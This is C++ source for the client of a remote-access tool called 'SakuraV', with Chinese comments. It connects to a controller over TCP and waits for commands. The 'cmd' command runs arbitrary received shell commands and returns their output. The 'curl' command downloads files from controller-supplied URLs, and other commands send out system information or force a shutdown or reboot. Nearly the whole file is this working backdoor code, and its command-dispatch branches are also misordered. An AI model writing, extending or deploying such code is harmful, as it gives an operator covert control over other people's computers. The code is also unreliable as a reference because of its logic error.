/* 这是 SakuraV 远控实现代码喵 作者：Commmkom */

#include "SakuraV.h"
#include "ClientNeed.h"
using namespace std;

void start_connect() {

	// 初始化WS
	WSADATA ws;
	int r = WSAStartup(MAKEWORD(2, 2), &ws);
	if (r != 0) {
		cout << "StartFailed" << endl;
		return;
		//错误处理
	}
	// 创建Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		cout << WSAGetLastError();
		return;
		//错误处理
	}
	cout << "socket created" << endl;
	// 准备连接信息
	sockaddr_in addr = {};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8072);
	inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
	int c = connect(sock, (sockaddr*)&addr, sizeof(addr));
	if (c == SOCKET_ERROR) {
		cout << WSAGetLastError();
		//清理
		closesocket(sock);
		WSACleanup();
		return;
		//错误处理
	}
	while (true) {
		string command;
		int i = RecvFrame(sock, command);
		if (i < 0) {
			cout << WSAGetLastError << endl;
			return;
		}
		else if (i > 0) {
			if (command == "curl") {
				string recv;
				SendFrame(sock, "curl command");
				RecvFrame(sock, recv);
				recv = "curl -O " + recv;
				system(recv.c_str());
				std::string output = GetConsoleContent();
				SendFrame(sock, output);
			}
		}
		else if (command == "systeminfo") {
			system("cls");
			system("systeminfo");
			string info = GetConsoleContent();
			SendFrame(sock, info);
		}
		else if (command == "cmd") {
			string recv;
			SendFrame(sock, "cmd command");
			RecvFrame(sock, recv);
			system("cls");
			system(recv.c_str());
			std::string output = GetConsoleContent();
			SendFrame(sock, output);
		}
		else if (command == "poweroff") {
			SendFrame(sock, "shutdown");
			system("shutdown -s -f");
		}
		else if (command == "reboot") {
			SendFrame(sock, "reboot");
			system("shutdown -r -f");
		}
		else {
			cout << "未知命令" << endl;
		}
	}
}